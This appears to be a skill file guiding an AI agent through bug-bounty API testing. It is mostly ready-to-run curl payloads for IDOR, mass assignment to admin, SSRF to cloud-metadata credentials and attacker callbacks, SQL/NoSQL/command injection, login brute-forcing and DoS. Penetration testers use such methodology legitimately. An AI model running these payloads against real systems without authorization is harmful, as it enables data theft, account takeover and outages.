---
name: api-security-testing
description: "REST/GraphQL/gRPC/SOAP API testing across the OWASP API Top 10 — BOLA/IDOR on object IDs, broken auth, mass assignment, SSRF, and API version differencing where /api/v1/ still lacks the authorization added in v2. Use when testing any /api/ route, mobile backend, or Swagger/OpenAPI spec, and whenever recon exposes an undocumented API surface."
---

# API Security Testing Methodology

## Crown Jewel Targets

- **BOLA/IDOR on financial APIs** -- `/api/v1/invoices/{id}`, `/api/v1/transactions/{id}` -- accessing other users' financial data is consistently Critical
- **GraphQL endpoints** with introspection enabled -- full schema dump reveals every query/mutation/type, including admin-only operations
- **API v1/v2 version mismatch** -- old API versions frequently lack authorization added in newer versions. Always test `/api/v1/` when `/api/v3/` is in use
- **Mobile-only API endpoints** -- developers assume only the app calls these, so auth checks are weaker. Decompile APK, extract endpoints, test with Burp
- **Bulk/export endpoints** -- `/api/v1/users`, `/api/bulk/export` often return ALL records without pagination limits
- **Webhook/callback registration** -- SSRF via `callback_url` parameter to internal services or cloud metadata
- **Mass assignment on registration/profile update** -- add `role=admin`, `isAdmin=true`, `plan=enterprise` to JSON body
- **Swagger/OpenAPI docs left in production** -- `/swagger.json`, `/api-docs`, `/v2/api-docs` expose full endpoint map

## Attack Surface Signals

- **URL patterns**: `/api/`, `/graphql`, `/rest/`, `/v1/`, `/v2/`, `/swagger.json`, `/openapi.json`, `/api-docs`
- **Response signals**: JSON/XML responses, `Content-Type: application/json`, pagination in response (`total`, `page`, `limit`)
- **Headers**: `X-API-Key`, `Authorization: Bearer`, `X-RateLimit-*`, `X-Request-Id`
- **JS indicators**: `fetch('/api/`, `axios.get`, `baseURL`, `API_ENDPOINT`, `graphqlEndpoint`

> Comprehensive API security testing based on OWASP API Top 10 (2023) and real bug bounty experience. APIs are the highest-density attack surface in modern applications.

## Discovery — Finding API Endpoints

### Passive Discovery
```bash
# OpenAPI/Swagger documentation (check all common paths)
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /swagger/v1/swagger.json \
  /v1/swagger.json /v2/api-docs /v3/api-docs /api/swagger.json /docs /redoc \
  /.well-known/openapi.yaml /api/openapi.yaml /api/v1/openapi.json; do
  curl -sk "https://TARGET${path}" -o /dev/null -w "%{http_code} %{size_download} ${path}\n"
done

# JS bundle analysis — extract API routes from SPA bundles
grep -rnoE '(fetch|axios|http)\s*[\.(]\s*[`"'"'"']/api/[^`"'"'"']+' target_js/
grep -rnoE '"(GET|POST|PUT|DELETE|PATCH)"\s*,\s*"[^"]+"' target_js/
grep -rnoE '/api/v[0-9]+/[a-zA-Z/]+' target_js/

# Wayback Machine + GAU for historical API endpoints
gau TARGET --subs --threads 5 | grep -iE '/api/|/graphql|/rest/|/v[0-9]+/' | sort -u

# Mobile app decompilation (APK → API endpoints)
# See: knowledge/patterns/mobile-api-testing.md
jadx -d output/ target.apk
grep -rnE 'https?://[^"]+/api/' output/

# Traffic interception — Burp proxy capture during normal browsing
# Map all endpoints via Playwright session + Burp proxy
```

### Active Discovery
```bash
# Wordlist-based API fuzzing
ffuf -u "https://TARGET/api/FUZZ" -w wordlists/api-endpoints.txt -mc 200,201,301,302,401,403,405 -ac

# HTTP method enumeration on discovered endpoints
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  curl -sk -X $method "https://TARGET/api/v1/users" -o /dev/null -w "$method: %{http_code}\n"
done

# Content-type fuzzing (some endpoints respond differently)
curl -sk -H "Content-Type: application/xml" -d '<user><id>1</id></user>' "https://TARGET/api/users"
curl -sk -H "Content-Type: application/json" -d '{"id":1}' "https://TARGET/api/users"
```

---

## API recon — documentation, methods, and parameter discovery

**Find the documentation before fuzzing.** Machine-readable specs are the higher-value find, because they enumerate every endpoint, method, parameter, and required type at once.

```bash
# Human-readable
/api/docs  /api/swagger-ui.html  /docs  /redoc  /api-docs  /swagger/index.html
# Machine-readable - import these into Burp (Burp Scanner parses OpenAPI directly)
/openapi.json  /swagger.json  /v2/api-docs  /v3/api-docs  /api/swagger.yaml  /.well-known/openapi.json
```
If no spec is exposed, a base-path walk often finds one: from a known `/api/v1/users`, try `/api/v1/`, `/api/`, and `/` for an index or doc route.

**Identify supported methods and content types before concluding an endpoint is uninteresting.** An endpoint that rejects `GET` may accept `POST`, `PUT`, `PATCH`, or `DELETE`, and authorization is frequently enforced on only one of them. Likewise, switching `Content-Type` from form-encoded to `application/json` (or XML) reaches a different parser with different validation — and is the prerequisite for nested-operator attacks such as `nosql-injection-testing`.

```bash
curl -sX OPTIONS https://target/api/v1/orders -i | grep -i allow
for m in GET POST PUT PATCH DELETE; do printf "%s " $m; curl -so /dev/null -w '%{http_code}\n' -X $m https://target/api/v1/orders/1; done
```

**Hidden parameters are where mass assignment lives.** Diff the fields a `GET` on a record returns against the fields the corresponding `PUT`/`PATCH` accepts — the response object is the best wordlist you will get, because frameworks commonly bind every attribute they serialise. Then probe with an invalid *type* (`{"isAdmin":"foo"}`) rather than a plausible value: a type error confirms the parameter is bound even when a valid value is silently ignored. For systematic discovery use `hidden-param-discovery` (arjun, Burp Param Miner).

## Attack Vectors

### A. Broken Object Level Authorization (BOLA/IDOR) — OWASP API-1

The single most common and highest-paid API vulnerability class.

```bash
# Test every endpoint with another user's ID
# User A token accessing User B resources
curl -sk -H "Authorization: Bearer TOKEN_USER_A" "https://TARGET/api/v1/users/USER_B_ID/profile"
curl -sk -H "Authorization: Bearer TOKEN_USER_A" "https://TARGET/api/v1/orders/ORDER_ID_USER_B"

# UUID is NOT secure — UUIDs leak in:
# - API responses listing resources
# - Email links, notifications
# - JS bundles, __NEXT_DATA__, window.__STATE__
# - Referrer headers, URL parameters
# - WebSocket messages

# Sequential/predictable IDs — increment/decrement
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/invoices/1001"
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/invoices/1002"

# Wildcard/list endpoints — fetch ALL resources
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/users"
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/users?limit=99999"

# Parameter pollution — array of IDs
curl -sk -H "Content-Type: application/json" -d '{"ids":["MY_ID","VICTIM_ID"]}' "https://TARGET/api/v1/bulk/export"
```

**Burp Autorize workflow**: Install Autorize extension. Login as User B, capture cookie. Browse as User A. Autorize auto-replays every request with User B cookie. Green = BOLA.

### B. Broken Authentication — OWASP API-2

```bash
# JWT attacks — cross-ref knowledge/patterns/jwt-testing.md
# Algorithm none, RS256→HS256 confusion, jku injection

# API key in URL (logged in proxies, access logs, referer)
# Search for: ?api_key=, ?token=, ?key=, ?access_token=
grep -rnE '[?&](api_key|token|key|access_token|secret)=' target_js/

# No auth on internal endpoints
curl -sk "https://TARGET/internal/api/users"
curl -sk "https://TARGET/api/admin/config"
curl -sk "https://TARGET/debug/vars"

# Token not invalidated on logout
# 1. Login → get token
# 2. Logout
# 3. Replay old token → should return 401
curl -sk -H "Authorization: Bearer OLD_TOKEN_AFTER_LOGOUT" "https://TARGET/api/me"

# Password reset token reuse
# Use password reset link → change password → try same link again
```

### C. Broken Object Property Level Authorization — OWASP API-3

```bash
# Mass assignment — send extra fields the API doesn't expect
# Normal registration:
curl -sk -X POST "https://TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"pass123"}'

# Mass assignment attack:
curl -sk -X POST "https://TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"pass123","role":"admin","isAdmin":true,"balance":999999,"verified":true,"plan":"enterprise"}'

# Profile update escalation:
curl -sk -X PUT "https://TARGET/api/v1/users/me" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin","permissions":["*"],"organizationId":"OTHER_ORG"}'

# Excessive data exposure — API returns more fields than UI shows
# Compare: what UI displays vs raw API response
curl -sk -H "Authorization: Bearer TOKEN" "https://TARGET/api/v1/users/me" | jq .
# Look for: password hashes, internal IDs, SSN, tokens, other users' data, billing info
```

### D. Unrestricted Resource Consumption — OWASP API-4

```bash
# No rate limiting on sensitive endpoints
# Brute force test: 100 requests in 10 seconds
for i in $(seq 1 100); do
  curl -sk -X POST "https://TARGET/api/login" \
    -d '{"email":"test@test.com","password":"attempt'$i'"}' -o /dev/null -w "%{http_code}\n" &
done

# Missing pagination limits
curl -sk "https://TARGET/api/users?limit=999999&offset=0"
curl -sk "https://TARGET/api/search?q=a&per_page=100000"

# Regex DoS (ReDoS) — long input to regex-heavy parameters
curl -sk "https://TARGET/api/search?q=$(python3 -c 'print("a"*50000+"!")')"

# Unbounded file upload
curl -sk -X POST "https://TARGET/api/upload" -F "file=@/dev/urandom;filename=huge.bin" -H "Content-Length: 999999999"
```

### E. Broken Function Level Authorization — OWASP API-5

```bash
# Admin endpoints accessible to regular users
curl -sk -H "Authorization: Bearer REGULAR_USER_TOKEN" "https://TARGET/api/v1/admin/users"
curl -sk -H "Authorization: Bearer REGULAR_USER_TOKEN" "https://TARGET/api/v1/admin/settings"
curl -sk -H "Authorization: Bearer REGULAR_USER_TOKEN" "https://TARGET/api/admin/export"

# HTTP method change — GET to DELETE, POST to PUT
curl -sk -X DELETE -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/v1/users/ADMIN_USER_ID"
curl -sk -X PUT -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/v1/settings" \
  -d '{"maintenance_mode":true}'

# API version mismatch — old versions may lack authorization
curl -sk -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/v1/admin/users"  # 403
curl -sk -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/v2/admin/users"  # 200?

# Path traversal in API routing
curl -sk "https://TARGET/api/v1/users/../admin/config"
```

### F. Server-Side Request Forgery — OWASP API-6

```bash
# URL parameters in API calls
curl -sk -X POST "https://TARGET/api/fetch" \
  -d '{"url":"http://PAYLOAD_HOST"}'

# Webhook configurations
curl -sk -X POST "https://TARGET/api/webhooks" \
  -d '{"callback_url":"http://PAYLOAD_HOST/webhook","events":["order.created"]}'

# File import from URL
curl -sk -X POST "https://TARGET/api/import" \
  -d '{"source_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# PDF/image generation from URL (cross-ref knowledge/patterns/pdf-ssrf.md)
curl -sk -X POST "https://TARGET/api/generate-pdf" \
  -d '{"html":"<img src=\"http://PAYLOAD_HOST/ssrf\">"}'
```

### G. Security Misconfiguration — OWASP API-7

```bash
# CORS wildcard with credentials
curl -sk -H "Origin: https://evil.com" -I "https://TARGET/api/v1/me" | grep -i access-control

# Verbose errors leaking stack traces
curl -sk "https://TARGET/api/v1/users/undefined" | jq .
curl -sk -X POST "https://TARGET/api/v1/login" -d '{"email":null}' -H "Content-Type: application/json"

# Debug mode enabled
curl -sk "https://TARGET/api/debug" "https://TARGET/api/_debug" "https://TARGET/actuator" \
  "https://TARGET/actuator/env" "https://TARGET/__debug__" "https://TARGET/api/health"

# Unnecessary HTTP methods (TRACE for XST)
curl -sk -X TRACE "https://TARGET/api/v1/users"
curl -sk -X OPTIONS "https://TARGET/api/v1/users" -I | grep "Allow:"
```

### H. Injection — OWASP API-8

```bash
# SQL injection in API parameters
curl -sk "https://TARGET/api/v1/users?id=1'OR'1'='1"
curl -sk -X POST "https://TARGET/api/v1/search" \
  -H "Content-Type: application/json" \
  -d '{"filter":"name","value":"test'\'' OR 1=1--"}'

# NoSQL injection (MongoDB)
curl -sk -X POST "https://TARGET/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Command injection in API parameters
curl -sk "https://TARGET/api/v1/ping?host=127.0.0.1;id"
curl -sk "https://TARGET/api/v1/convert?filename=test%0aid"

# GraphQL injection
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id:\"1\\\" OR 1=1--\") { email } }"}'
```

### I. Improper Assets Management — OWASP API-9

```bash
# Old API versions still accessible
for v in v1 v2 v3 v4 beta alpha internal staging dev test; do
  curl -sk "https://TARGET/api/${v}/users" -o /dev/null -w "%{http_code} /api/${v}/users\n"
done

# Exposed debug/dev endpoints
curl -sk "https://TARGET/api/test" "https://TARGET/api/dev" "https://TARGET/api/staging"
curl -sk "https://TARGET/api/graphql/playground" "https://TARGET/graphql?query={__schema{types{name}}}"

# Beta APIs without auth
curl -sk "https://TARGET/beta/api/users" "https://TARGET/api-beta/v1/users"

# API documentation left in production
curl -sk "https://TARGET/api-docs" "https://TARGET/swagger-ui/" "https://TARGET/graphql"
```

### J. Unsafe Consumption of APIs — OWASP API-10

```bash
# If API consumes third-party data without validation:
# 1. Find webhook/callback endpoints
# 2. Register your controlled callback
# 3. Return malicious payload in response
# Examples:
# - Payment webhook returns {"amount": -100} → API credits account
# - OAuth provider returns {"email": "admin@target.com"} → account takeover
# - Import API trusts CSV headers → injection via imported data
```

---

## GraphQL-Specific Testing

```bash
# Introspection query (should be disabled in production)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'

# If introspection disabled — field suggestion abuse
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ use }"}'
# Error: "Did you mean 'user'?" → enumerate fields

# Batch query abuse (bypass rate limiting)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(u:\"a\",p:\"1\")}{token}"},{"query":"mutation{login(u:\"a\",p:\"2\")}{token}"}]'

# Alias-based batching
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} }"}'

# Nested query DoS (resource exhaustion)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { email }}}}}}}}}"}'

# Mutation abuse — check authorization on every mutation
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: \"VICTIM_ID\") { success } }"}'
```

---

## Rate Limit Testing on APIs

```bash
# Per-endpoint rate limit differences
# Login may have rate limit, but /api/v1/check-email may not
# Password reset may limit, but /api/verify-token may not

# Race conditions on state-changing operations
# Use Burp Turbo Intruder or parallel curl:
# Apply coupon + place order simultaneously
# Transfer money from A→B + A→C simultaneously (double-spend)

# Cross-ref: knowledge/patterns/rate-limit-bypass.md
# Cross-ref: knowledge/patterns/race-condition-testing.md
```

---

## Impact Requirements & Triage Checklist

Before reporting any API finding:

1. **Proven impact**: Data theft, privilege escalation, financial loss, or account takeover. Not just "misconfiguration exists"
2. **Two-account proof for BOLA/IDOR**: Demonstrate User A accessing User B data. Single-account = insufficient
3. **Sensitive data identified**: Name the specific fields exposed (PII, financial data, tokens). Generic "data exposure" = reject
4. **Authentication bypass proven**: Show the full chain from unauthenticated/low-priv to accessing protected resource
5. **Business impact articulated**: How does this affect real users? Dollar amount if financial. User count if data breach
6. **Reproducible steps**: Raw HTTP requests (Burp Repeater format), not screenshots of Postman. Must be reproducible by triager in < 5 minutes

## PortSwigger Academy — Advanced Techniques

- **Server-side parameter pollution — query truncation**: `%23` (URL `#`) truncates backend API query, removing restrictions like `publicProfile=true`
- **SSPP parameter override**: `%26name=carlos` duplicates param — PHP=last, Node=first, ASP.NET=concatenated
- **REST path injection**: `peter%2f..%2fadmin` in user input embedded in API paths
- **JSON parameter pollution**: From plain-text: `peter","access_level":"administrator`; from JSON: escaped quotes
- **Version downgrade**: Replace `/api/v3/` with `/api/v1/`, `/api/beta/`, `/api/internal/`
- **Base path walking**: From known path, walk up for Swagger docs
- **Mass assignment probe**: Submit `{"isAdmin":"foo"}` (invalid type) — observe behavioral difference

## Operator Notes (Battle-Tested)

1. **Burp Autorize is the #1 tool for API BOLA/IDOR** -- set up User B cookie, browse as User A, Autorize auto-replays every request with User B creds. Green rows = confirmed BOLA. This is orders of magnitude faster than manual testing.
2. **Two-account proof is MANDATORY for IDOR** -- single-account testing is insufficient for triage. Create user A and user B, demonstrate A accessing B's resources with B's IDs. Without two accounts, finding is rejected.
3. **Always try API version downgrade** -- if app uses `/api/v3/`, try `/api/v1/` and `/api/v2/`. Old versions often have weaker auth. Also try `/api/beta/`, `/api/internal/`, `/api/staging/`.
4. **Mass assignment: send `{"isAdmin":"foo"}` first** -- if the server returns a validation error like "isAdmin must be boolean", you confirmed the field exists and is processed. Then send `{"isAdmin":true}`. Behavioral difference = evidence.
5. **GraphQL: batch queries bypass rate limiting** -- even when individual queries are rate-limited, batch queries (`[{query1},{query2},...{query100}]`) or alias-based batching (`{a1:login(p:"1") a2:login(p:"2")}`) often bypass per-request limits.

## Related Skills & Chains

| When | Go to |
|------|-------|
| IDOR/BAC on API endpoints | `access-control-testing` |
| GraphQL introspection or field suggestion | `graphql-testing` |
| Need to discover hidden API params | `hidden-param-discovery` |
| Rate limiting blocks API testing | `rate-limit-bypass` |
| MongoDB/Redis backend (NoSQLi) | `sql-injection-testing` → `references/nosqli-techniques.md` |
| URL param in API accepts internal URLs | `ssrf-testing` |
| Mobile app exposes additional API endpoints | `mobile-api-testing` |
